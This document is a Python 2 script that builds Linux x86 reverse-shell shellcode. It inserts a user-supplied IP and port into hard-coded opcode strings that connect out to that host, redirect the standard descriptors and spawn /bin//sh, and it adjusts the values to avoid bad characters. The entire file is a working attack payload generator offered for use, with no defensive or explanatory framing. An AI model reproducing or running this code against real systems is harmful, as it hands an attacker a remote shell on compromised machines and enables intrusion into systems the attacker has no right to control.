#!/usr/bin/python
import sys, socket


def usage():
    print("Usage: reverse_shell_builder.py <ip> <port>")
    print("port must be between 1 and 65535 except range from 3330 to 3339")

def port_wrapper(port):
    port = hex(socket.htons(int(port)))
    if len(str(port[4:6])) < 2:
        port = "\\x" + port[4:6] + "0" + "\\x" + port[2:4]
    elif len(str(port[2:4])) < 2:
        port = "\\x" + port[4:6] + "\\x" + port[2:4] + "0"
    else:
        port = "\\x" + port[4:6] + "\\x" + port[2:4]
    return port

def ip_wrapper(ip):
    octects = ip.split(".")
    ips = []
    for octect in octects:
        ips.append(hex(int(octect) + 1))
    newips = []
    for ip in ips:
        if len(str(ip[2:4])) < 2:
            newips.append("\\x" + "0" + ip[2:4])
        else:
            newips.append("\\x" + ip[2:4])
    s = ""
    ip = s.join(newips)
    return ip

def main():
    green = lambda text: '\033[0;32m' + text + '\033[0m'
    ip = sys.argv[1]
    port = int(sys.argv[2])

    if len(sys.argv) != 3:
        print("[-] You have to input an IP and/or a port number!")
        usage()
        exit(0)

    if port < 1 or port > 65535:
        print("[-] This is not a valid port number!")
        usage()
        exit(0)

    ## check tech notes below for this      
    if port >= 3330 and port <= 3339:
        print("[-] This port produces badchars!")
        usage()
        exit(0)

    if port <= 1024:
        print(green("[+] This port requires root privileges"))

    ip = ip_wrapper(sys.argv[1])        
    port = port_wrapper(sys.argv[2])

    shellcode_first = ""
    shellcode_first += "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb1\\x01\\xb3\\x02\\x66"
    shellcode_first += "\\xb8\\x67\\x01\\xcd\\x80\\x89\\xc7\\xb2\\x16\\x31\\xc9\\x51\\xb9"
    ### Inject IP here
    shellcode_second = ""
    shellcode_second += "\\x81\\xe9\\x01\\x01\\x01\\x01\\x51\\x66\\x68"
    ### inject port number here
    shellcode_third = ""
    shellcode_third += "\\x66\\x6a\\x02\\x89\\xe1\\x89\\xfb\\x66\\xb8\\x6a\\x01\\xcd\\x80"
    shellcode_third += "\\x31\\xdb\\x31\\xc9\\xb1\\x03\\x31\\xc0\\x89\\xfb\\xb0\\x3f\\xfe"
    shellcode_third += "\\xc9\\xcd\\x80\\x75\\xf4\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68"
    shellcode_third += "\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1"
    shellcode_third += "\\xb0\\x0b\\xcd\\x80";

    print green("IP " + sys.argv[1] +  " added up by 1 and converted")
    print green("[*]" + ip + "\n")
    print green("Port " + sys.argv[2] + " converted")
    print green("[*]" + port + "\n")   
    
    print '"' + shellcode_first + green(ip) + shellcode_second + green(port) + shellcode_third + '"'

if __name__ == '__main__':
        main()
